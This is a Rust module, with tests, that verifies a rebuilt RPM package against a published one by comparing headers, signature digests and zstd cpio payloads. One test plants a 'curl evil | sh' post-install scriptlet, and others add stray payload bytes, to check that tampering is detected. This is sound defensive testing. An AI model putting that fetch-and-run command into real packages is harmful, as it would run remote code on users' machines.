//! Compare RPM packages by header and payload.
//!
//! The zstd cpio payloads are walked in lockstep, the rebuilt one as the reference: every entry
//! header must be equal apart from the file size, and every file's contents too, unless a rule
//! accepts the difference (Go build IDs, kernel module signatures, the certificate in
//! `/boot/vmlinuz`). Header tags must be equal, except those derived from the payload, which are
//! recomputed from the published payload; FILECLASS and CLASSDICT, libmagic descriptions that
//! include ELF build IDs, are not compared. The signature header must have the rebuilt one's tags,
//! and its header digests must match.

use crate::error::Result;
use crate::fsfiles::{self, FileReport, Status};
use crate::{goelf, kernel, kmod};
use num_traits::FromPrimitive;
use rpm::{CompressionType, DigestStatus, IndexData, IndexSignatureTag as Sig, IndexTag as Tag};
use serde::Serialize;
use sha2_0_11::{Digest, Sha256};
use snafu::{ensure_whatever, OptionExt, ResultExt};
use std::collections::BTreeMap;
use std::io::Read;

/// Tag values shown longer than this are truncated.
const MAX_SHOWN_VALUE: usize = 512;

/// The kernel image, whose module signing certificate differs per build.
const VMLINUZ: &str = "/boot/vmlinuz";

type Tags = BTreeMap<u32, IndexData>;

/// The tags of a header without its region tags, failing if one appears twice: only one of them
/// would be compared.
fn header_tags<T: rpm::Tag>(header: &rpm::Header<T>) -> Result<Tags> {
    let entries = header.get_all_entries().whatever_context("bad header")?;
    let count = entries.len();
    let mut tags: Tags = entries.into_iter().collect();
    ensure_whatever!(tags.len() == count, "a header tag appears more than once");
    tags.retain(|tag, _| !(61..=63).contains(tag));
    Ok(tags)
}

/// A parsed package, with its payload decompressed.
struct Package {
    rpm: rpm::Package,
    tags: Tags,
    signature: Tags,
    cpio: Vec<u8>,
}

impl Package {
    fn parse(bytes: &[u8]) -> Result<Self> {
        let rpm = rpm::Package::parse(&mut &bytes[..]).whatever_context("bad package")?;
        let tags = header_tags(&rpm.metadata.header)?;
        // Without it, the `rpm` crate decodes strings that are not UTF-8 lossily.
        ensure_whatever!(
            matches!(tags.get(&(Tag::RPMTAG_ENCODING as u32)), Some(IndexData::StringTag(e)) if e == "utf-8"),
            "header does not declare the utf-8 encoding"
        );
        // The SDK compresses every payload with zstd. Nothing compares the compressed payload, so
        // it may hold nothing but one frame, which the decoder would otherwise skip past.
        let frame = zstd::zstd_safe::find_frame_compressed_size(&rpm.payload).ok();
        ensure_whatever!(
            rpm.metadata.get_payload_compressor().ok() == Some(CompressionType::Zstd)
                && rpm.payload.starts_with(b"\x28\xb5\x2f\xfd")
                && frame == Some(rpm.payload.len()),
            "payload is not a single zstd frame"
        );
        let cpio = zstd::decode_all(rpm.payload.as_slice()).whatever_context("bad zstd payload")?;
        let signature = header_tags(&rpm.metadata.signature)?;
        Ok(Self {
            rpm,
            tags,
            signature,
            cpio,
        })
    }
}

/// The result of comparing a rebuilt package against a published one.
#[derive(Debug, Clone, Serialize)]
pub struct PackageReport {
    pub status: Status,
    pub detail: String,
    /// How the headers differ, after recomputing the tags derived from the payload.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub header: Vec<String>,
    /// Payload entries that differ.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub files: Vec<FileReport>,
}

impl PackageReport {
    /// A report of a file that is not compared as a package.
    pub fn new(status: Status, detail: String) -> Self {
        let (header, files) = (Vec::new(), Vec::new());
        Self {
            status,
            detail,
            header,
            files,
        }
    }
}

/// What walking the payloads found.
#[derive(Default)]
struct Walk {
    files: Vec<FileReport>,
    /// The published size and digest of each differing regular file, by path.
    changed: BTreeMap<String, (u64, String)>,
    /// The paths of each hard-linked inode.
    links: BTreeMap<u32, Vec<String>>,
    /// The change in installed size.
    delta: i128,
}

fn sha256(data: &[u8]) -> String {
    hex::encode(Sha256::digest(data))
}

/// Whether a rule accepts the difference between a rebuilt and a published regular file, and why.
fn compare_contents(path: &str, rebuilt: &[u8], published: &[u8]) -> (Status, String) {
    let (expected, mismatch) = (Status::ExpectedDifference, Status::Mismatch);
    let result = if path == VMLINUZ {
        kernel::compare_vmlinuz(rebuilt, published)
    } else if kmod::is_module(path.as_bytes()) {
        let body = |data| -> Result<_> {
            let module = kmod::decompress(path.as_bytes(), data)?;
            Ok(kmod::split_signature(&module)?.map(|(body, _)| body.to_vec()))
        };
        match (body(rebuilt), body(published)) {
            (Ok(Some(r)), Ok(Some(p))) if r == p => {
                return (expected, "differs only in its module signature".into())
            }
            (Err(e), _) | (_, Err(e)) => Err(e),
            _ => return (mismatch, "module differs beyond its signature".into()),
        }
    } else if let Some(result) = goelf::compare_go_binaries(rebuilt, published) {
        result
    } else {
        let digest = |d: &[u8]| format!("{} bytes, sha256 {}", d.len(), sha256(d));
        let detail = format!(
            "contents differ ({} vs {})",
            digest(rebuilt),
            digest(published)
        );
        return (mismatch, detail);
    };
    match result {
        Ok(detail) => (expected, detail),
        Err(e) => (mismatch, snafu::Report::from_error(e).to_string()),
    }
}

/// Walk both cpio archives in lockstep, stopping at the first entry whose header differs.
fn walk(rebuilt: &[u8], published: &[u8]) -> Result<Walk> {
    let mut out = Walk::default();
    let mismatch = |path: &str, detail: String| FileReport {
        path: path.to_string(),
        status: Status::Mismatch,
        detail,
    };
    let (mut r, mut p) = (rebuilt, published);
    loop {
        let mut re = cpio::newc::Reader::new(r).whatever_context("bad rebuilt cpio entry")?;
        let mut pe = cpio::newc::Reader::new(p).whatever_context("bad published cpio entry")?;
        let fields = |e: &cpio::newc::Entry| {
            let ids = [e.ino(), e.mode(), e.uid(), e.gid(), e.nlink(), e.mtime()];
            let devs = [e.dev_major(), e.dev_minor(), e.rdev_major(), e.rdev_minor()];
            (e.name().to_string(), ids, devs)
        };
        let (e, a) = (fields(re.entry()), fields(pe.entry()));
        let path = e.0.strip_prefix('.').unwrap_or(&e.0).to_string();
        if e != a {
            out.files
                .push(mismatch(&path, format!("cpio entry {e:?} vs {a:?}")));
            return Ok(out);
        }
        let trailer = re.entry().is_trailer();
        let [ino, mode, _, _, nlink, _] = e.1;
        let (mut rc, mut pc) = (Vec::new(), Vec::new());
        re.read_to_end(&mut rc)
            .and_then(|_| pe.read_to_end(&mut pc))
            .whatever_context("failed to read the payload")?;
        r = re.finish().whatever_context("bad rebuilt cpio entry")?;
        p = pe.finish().whatever_context("bad published cpio entry")?;
        if trailer {
            if r != p {
                let detail = format!("followed by {} vs {} bytes", r.len(), p.len());
                out.files.push(mismatch("cpio trailer", detail));
            }
            return Ok(out);
        }
        let regular = mode & 0o170000 == 0o100000;
        if regular && nlink > 1 {
            out.links.entry(ino).or_default().push(path.clone());
        }
        if rc == pc {
            continue;
        }
        let (status, detail) = if regular {
            out.delta += pc.len() as i128 - rc.len() as i128;
            out.changed
                .insert(path.clone(), (pc.len() as u64, sha256(&pc)));
            compare_contents(&path, &rc, &pc)
        } else {
            let detail = format!("{} vs {}", fsfiles::display(&rc), fsfiles::display(&pc));
            (Status::Mismatch, format!("contents differ: {detail}"))
        };
        out.files.push(FileReport {
            path,
            status,
            detail,
        });
    }
}

/// Set element `i` of a numeric tag value to `value`.
fn set_int(data: &mut IndexData, i: usize, value: u64) -> Result<()> {
    let slot = match data {
        IndexData::Int32(v) => u32::try_from(value)
            .ok()
            .zip(v.get_mut(i))
            .map(|(value, n)| *n = value),
        IndexData::Int64(v) => v.get_mut(i).map(|n| *n = value),
        _ => None,
    };
    slot.with_whatever_context(|| format!("a size tag cannot hold {value}"))
}

fn first_int(data: &IndexData) -> Option<u64> {
    match data {
        IndexData::Int32(v) => v.first().map(|n| u64::from(*n)),
        IndexData::Int64(v) => v.first().copied(),
        _ => None,
    }
}

/// The rebuilt header, with the tags derived from the payload recomputed for the published one.
fn expected_header(rebuilt: &Package, published: &Package, walk: &Walk) -> Result<Tags> {
    let mut tags = rebuilt.tags.clone();
    let tag = |t: Tag| t as u32;
    let algorithm = tags
        .get(&tag(Tag::RPMTAG_FILEDIGESTALGO))
        .and_then(first_int);
    ensure_whatever!(
        walk.changed.is_empty() || algorithm == Some(8),
        "the rebuilt header does not use SHA-256 file digests"
    );
    let paths = rebuilt
        .rpm
        .metadata
        .get_file_paths()
        .whatever_context("bad file paths")?;
    let index: BTreeMap<String, usize> = paths
        .iter()
        .enumerate()
        .map(|(i, p)| (p.to_string_lossy().into_owned(), i))
        .collect();
    for (path, (size, digest)) in &walk.changed {
        // Every link of a hard-linked file records its size and digest.
        let links = walk.links.values().find(|links| links.contains(path));
        for path in links.map_or(std::slice::from_ref(path), Vec::as_slice) {
            let i = *index
                .get(path)
                .with_whatever_context(|| format!("{path} is not in the header"))?;
            for size_tag in [Tag::RPMTAG_FILESIZES, Tag::RPMTAG_LONGFILESIZES] {
                if let Some(data) = tags.get_mut(&tag(size_tag)) {
                    set_int(data, i, *size)?;
                }
            }
            let digests = match tags.get_mut(&tag(Tag::RPMTAG_FILEDIGESTS)) {
                Some(IndexData::StringArray(v)) => v.get_mut(i),
                _ => None,
            };
            *digests.with_whatever_context(|| format!("no digest for {path}"))? = digest.clone();
        }
    }
    for size_tag in [Tag::RPMTAG_SIZE, Tag::RPMTAG_LONGSIZE] {
        if let Some(data) = tags.get_mut(&tag(size_tag)) {
            let size = first_int(data).map_or(0, i128::from) + walk.delta;
            set_int(data, 0, u64::try_from(size).unwrap_or(u64::MAX))?;
        }
    }
    let lens = |p: &Package| [p.rpm.payload.len() as u64, p.cpio.len() as u64];
    let (rebuilt_lens, published_lens) = (lens(rebuilt), lens(published));
    for (digest_tag, data) in [
        (Tag::RPMTAG_PAYLOADSHA256, &published.rpm.payload),
        (Tag::RPMTAG_PAYLOADSHA256ALT, &published.cpio),
    ] {
        if let Some(IndexData::StringArray(v)) = tags.get_mut(&tag(digest_tag)) {
            *v = vec![sha256(data)];
        }
    }
    // A payload size tag records the compressed or the decompressed length; which one is seen in
    // the rebuilt header. One that records neither is compared as it is.
    for size_tag in [
        Tag::RPMTAG_ARCHIVESIZE,
        Tag::RPMTAG_LONGARCHIVESIZE,
        Tag::RPMTAG_PAYLOADSIZE,
        Tag::RPMTAG_PAYLOADSIZEALT,
    ] {
        if let Some(data) = tags.get_mut(&tag(size_tag)) {
            let at = first_int(data).and_then(|v| rebuilt_lens.iter().position(|len| *len == v));
            if let Some(at) = at {
                set_int(data, 0, published_lens[at])?;
            }
        }
    }
    Ok(tags)
}

/// How the published signature header is wrong: tags the rebuilt one lacks or has, and header
/// digests that do not match the published header.
fn check_signature(rebuilt: &Package, published: &Package) -> Result<Vec<String>> {
    let name = |t: u32| Sig::from_u32(t).map_or(format!("tag {t}"), |t| t.to_string());
    let mut problems: Vec<String> = fsfiles::union_keys(&rebuilt.signature, &published.signature)
        .into_iter()
        .filter(|t| rebuilt.signature.contains_key(t) != published.signature.contains_key(t))
        .map(|t| {
            let side = if published.signature.contains_key(t) {
                "published"
            } else {
                "rebuilt"
            };
            format!("signature {}: only in the {side} package", name(*t))
        })
        .collect();
    let report = published
        .rpm
        .metadata
        .check_digests()
        .whatever_context("bad header digests")?;
    for (digest, status) in [
        ("SHA1", report.header_sha1),
        ("SHA256", report.header_sha256),
    ] {
        if matches!(status, DigestStatus::Mismatch { .. }) {
            problems.push(format!(
                "signature {digest}: does not match the published header"
            ));
        }
    }
    Ok(problems)
}

/// Describe a tag value, truncated if long.
fn show(value: Option<&IndexData>) -> String {
    let shown = value.map_or("absent".to_string(), |v| format!("{v:?}"));
    match shown.char_indices().nth(MAX_SHOWN_VALUE) {
        Some((end, _)) => format!("{}...", &shown[..end]),
        None => shown,
    }
}

/// Compare a rebuilt package against a published one, failing if either cannot be parsed.
pub fn compare(rebuilt: &[u8], published: &[u8]) -> Result<PackageReport> {
    let rebuilt = Package::parse(rebuilt).whatever_context("rebuilt package")?;
    let published = Package::parse(published).whatever_context("published package")?;
    let walk = walk(&rebuilt.cpio, &published.cpio)?;
    let mut header = check_signature(&rebuilt, &published)?;
    if rebuilt.rpm.metadata.lead != published.rpm.metadata.lead {
        header.push("the leads differ".to_string());
    }
    let expected = expected_header(&rebuilt, &published, &walk)?;
    let uncompared = [Tag::RPMTAG_FILECLASS as u32, Tag::RPMTAG_CLASSDICT as u32];
    for t in fsfiles::union_keys(&expected, &published.tags) {
        let (e, a) = (expected.get(t), published.tags.get(t));
        if e != a && !uncompared.contains(t) {
            let name = Tag::from_u32(*t).map_or(format!("tag {t}"), |t| t.to_string());
            let name = name.trim_start_matches("RPMTAG_");
            header.push(format!("{name}: {} vs {}", show(e), show(a)));
        }
    }

    let files = walk.files;
    let mismatches = files
        .iter()
        .filter(|f| f.status == Status::Mismatch)
        .count();
    let (n, tags) = (files.len(), header.len());
    let (status, detail) = if tags > 0 || mismatches > 0 {
        let detail = format!("{tags} header tags and {mismatches} of {n} differing files differ");
        (Status::Mismatch, detail)
    } else if n > 0 {
        let detail = format!("{n} files differ only in Go build IDs or kernel signing");
        (Status::ExpectedDifference, detail)
    } else if rebuilt.rpm.payload == published.rpm.payload {
        (Status::Match, "identical".to_string())
    } else {
        let detail = "only the compressed payloads differ".to_string();
        (Status::Mismatch, detail)
    };
    Ok(PackageReport {
        status,
        detail,
        header,
        files,
    })
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::goelf::tests::{go_elf, PUBLISHED, REBUILT};
    use crate::kernel::tests::x86_image;
    use crate::kmod::tests::sign;
    use rpm::{HeaderEntry, IndexData::*, Lead, PackageMetadata};

    /// A file in a test package: path, mode and contents.
    pub(crate) type FileSpec<'a> = (&'a str, u32, &'a [u8]);

    fn cpio_entry(out: &mut Vec<u8>, ino: u32, mode: u32, name: &[u8], data: &[u8]) {
        let fields = [ino, mode, 0, 0, 1, 0, data.len() as u32, 0, 0, 0, 0];
        out.extend_from_slice(b"070701");
        for f in fields.iter().chain(&[name.len() as u32 + 1, 0]) {
            out.extend_from_slice(format!("{f:08x}").as_bytes());
        }
        for part in [name, b"\0", data] {
            out.extend_from_slice(part);
            // The name ends with its NUL, which is followed by padding.
            if part != name {
                out.resize(out.len().next_multiple_of(4), 0);
            }
        }
    }

    /// A package holding `files`, as rpm builds it. `edit_cpio` changes the payload before it is
    /// compressed, and `edit` the header and signature header before the signature header records
    /// the header's digest.
    pub(crate) fn package_with(
        files: &[FileSpec],
        edit_cpio: impl FnOnce(&mut Vec<u8>),
        edit: impl FnOnce(&mut Tags, &mut Tags),
    ) -> Vec<u8> {
        let mut cpio = Vec::new();
        for (i, (path, mode, data)) in files.iter().enumerate() {
            cpio_entry(
                &mut cpio,
                i as u32 + 1,
                *mode,
                format!(".{path}").as_bytes(),
                data,
            );
        }
        cpio_entry(&mut cpio, 0, 0, b"TRAILER!!!", b"");
        edit_cpio(&mut cpio);
        let payload = zstd::encode_all(&cpio[..], 0).unwrap();
        let regular = |f: &FileSpec| f.1 & 0o170000 == 0o100000;
        let list = |f: fn(&FileSpec) -> String| files.iter().map(f).collect();
        let (dir, base) = (
            |f: &FileSpec| f.0.rsplit_once('/').unwrap().0.to_string() + "/",
            |f: &FileSpec| f.0.rsplit_once('/').unwrap().1.to_string(),
        );
        let mut tags: Tags = [
            (Tag::RPMTAG_NAME, StringTag("test".into())),
            (Tag::RPMTAG_ENCODING, StringTag("utf-8".into())),
            (Tag::RPMTAG_PAYLOADCOMPRESSOR, StringTag("zstd".into())),
            (Tag::RPMTAG_FILEDIGESTALGO, Int32(vec![8])),
            (
                Tag::RPMTAG_SIZE,
                Int32(vec![files.iter().map(|f| f.2.len() as u32).sum()]),
            ),
            (
                Tag::RPMTAG_FILESIZES,
                Int32(files.iter().map(|f| f.2.len() as u32).collect()),
            ),
            (
                Tag::RPMTAG_FILEMODES,
                Int16(files.iter().map(|f| f.1 as u16).collect()),
            ),
            (
                Tag::RPMTAG_FILEDIGESTS,
                StringArray(
                    files
                        .iter()
                        .map(|f| {
                            if regular(f) {
                                sha256(f.2)
                            } else {
                                String::new()
                            }
                        })
                        .collect(),
                ),
            ),
            (
                Tag::RPMTAG_DIRINDEXES,
                Int32((0..files.len() as u32).collect()),
            ),
            (Tag::RPMTAG_DIRNAMES, StringArray(list(dir))),
            (Tag::RPMTAG_BASENAMES, StringArray(list(base))),
            (
                Tag::RPMTAG_PAYLOADSHA256,
                StringArray(vec![sha256(&payload)]),
            ),
            (Tag::RPMTAG_PAYLOADSIZE, Int64(vec![cpio.len() as u64])),
        ]
        .into_iter()
        .map(|(t, d)| (t as u32, d))
        .collect();
        let mut signature = Tags::new();
        edit(&mut tags, &mut signature);
        let write = |signature: Tags| {
            let mut out = Vec::new();
            let header = |tags: Tags| tags.into_iter().map(|(t, d)| HeaderEntry::new(t, d));
            PackageMetadata {
                lead: Lead::new("test"),
                signature: rpm::Header::from_entries(header(signature), Sig::HEADER_SIGNATURES),
                header: rpm::Header::from_entries(
                    header(tags.clone()),
                    Tag::RPMTAG_HEADERIMMUTABLE,
                ),
            }
            .write(&mut out)
            .unwrap();
            out
        };
        let unsigned = write(Tags::new());
        let offsets = PackageMetadata::parse(&mut &unsigned[..])
            .unwrap()
            .get_package_segment_offsets();
        let digest = sha256(&unsigned[offsets.header as usize..]);
        signature
            .entry(Sig::RPMSIGTAG_SHA256 as u32)
            .or_insert(StringTag(digest));
        [write(signature), payload].concat()
    }

    pub(crate) fn package(files: &[FileSpec]) -> Vec<u8> {
        package_with(files, |_| {}, |_, _| {})
    }

    fn compare_files(rebuilt: &[FileSpec], published: &[FileSpec]) -> PackageReport {
        compare(&package(rebuilt), &package(published)).unwrap()
    }

    const TOOL: &str = "/usr/bin/tool";
    const MODULE: &str = "/lib/modules/xfs.ko";

    #[test]
    fn expected_differences() {
        let (r_tool, p_tool) = (
            go_elf(REBUILT, &[1; 20], b"code"),
            go_elf(PUBLISHED, &[2; 20], b"code"),
        );
        let (r_module, p_module) = (
            sign(b"\x7fELF xfs", b"key 1"),
            sign(b"\x7fELF xfs", b"key 2"),
        );
        let (r_kernel, p_kernel) = (x86_image(1, 1, b"x"), x86_image(2, 2, b"x"));
        let conf: FileSpec = ("/etc/conf", 0o100644, b"conf");
        assert_eq!(compare_files(&[conf], &[conf]).status, Status::Match);
        let report = compare_files(
            &[
                (TOOL, 0o100755, &r_tool),
                (MODULE, 0o100644, &r_module),
                (VMLINUZ, 0o100644, &r_kernel),
                conf,
            ],
            &[
                (TOOL, 0o100755, &p_tool),
                (MODULE, 0o100644, &p_module),
                (VMLINUZ, 0o100644, &p_kernel),
                conf,
            ],
        );
        assert_eq!(report.status, Status::ExpectedDifference, "{report:?}");
        assert_eq!(report.files.len(), 3);
    }

    #[test]
    fn other_payload_differences_fail() {
        let (a, b): (FileSpec, FileSpec) = (("/a", 0o100644, b"a"), ("/b", 0o100644, b"b"));
        let cases: [(&[FileSpec], &[FileSpec], &str); 6] = [
            (
                &[(TOOL, 0o100755, b"rebuilt")],
                &[(TOOL, 0o100755, b"publish")],
                "contents differ (",
            ),
            (
                &[("/l", 0o120777, b"a")],
                &[("/l", 0o120777, b"b")],
                "contents differ: a vs b",
            ),
            (
                &[(MODULE, 0o100644, &sign(b"\x7fELF", b"k"))],
                &[(MODULE, 0o100644, b"\x7fELF")],
                "module differs",
            ),
            (
                &[(TOOL, 0o100755, b"x")],
                &[(TOOL, 0o104755, b"x")],
                "cpio entry",
            ),
            (&[a, b], &[b, a], "cpio entry"),
            (&[a, b], &[a, ("/c", 0o100644, b"b")], "cpio entry"),
        ];
        for (rebuilt, published, detail) in cases {
            let report = compare_files(rebuilt, published);
            assert_eq!(report.status, Status::Mismatch, "{detail}");
            assert!(report.files[0].detail.starts_with(detail), "{report:?}");
        }
    }

    #[test]
    fn published_headers_must_describe_their_payload() {
        let (r_tool, p_tool) = (
            go_elf(REBUILT, &[1; 20], b"code"),
            go_elf(PUBLISHED, &[2; 20], b"code"),
        );
        let rebuilt = package(&[(TOOL, 0o100755, &r_tool)]);
        let tool: &[FileSpec] = &[(TOOL, 0o100755, &p_tool)];
        let stale = sha256(&r_tool);
        let header = |tag: Tag, value: IndexData| {
            package_with(tool, |_| {}, |t, _| drop(t.insert(tag as u32, value)))
        };
        let signature = |tag: Sig, value: IndexData| {
            package_with(tool, |_| {}, |_, s| drop(s.insert(tag as u32, value)))
        };
        let cases = [
            (
                "FILEDIGESTS:",
                header(Tag::RPMTAG_FILEDIGESTS, StringArray(vec![stale])),
            ),
            ("FILESIZES:", header(Tag::RPMTAG_FILESIZES, Int32(vec![1]))),
            (
                "PAYLOADSHA256:",
                header(Tag::RPMTAG_PAYLOADSHA256, StringArray(vec!["0".into()])),
            ),
            (
                "POSTIN:",
                header(Tag::RPMTAG_POSTIN, StringTag("curl evil | sh".into())),
            ),
            (
                "signature SHA256:",
                signature(Sig::RPMSIGTAG_SHA256, StringTag("0".into())),
            ),
            (
                "signature RPMSIGTAG_RSA:",
                signature(Sig::RPMSIGTAG_RSA, Bin(b"sig".to_vec())),
            ),
            (
                "cpio trailer",
                package_with(tool, |cpio| cpio.extend(b"evil"), |_, _| {}),
            ),
        ];
        for (problem, published) in cases {
            let report = compare(&rebuilt, &published).unwrap();
            assert_eq!(report.status, Status::Mismatch, "{problem}");
            let found = report
                .header
                .iter()
                .chain(report.files.iter().map(|f| &f.path));
            assert!(
                found.clone().any(|h| h.starts_with(problem)),
                "{problem}: {report:?}"
            );
        }

        let gzip = header(Tag::RPMTAG_PAYLOADCOMPRESSOR, StringTag("gzip".into()));
        // A skippable frame, which the decoder would skip.
        let skippable = [package(tool), b"\x50\x2a\x4d\x18\x04\0\0\0evil".to_vec()].concat();
        for published in [gzip, skippable] {
            let err = snafu::Report::from_error(compare(&rebuilt, &published).unwrap_err());
            assert!(err.to_string().contains("not a single zstd frame"), "{err}");
        }
    }
}
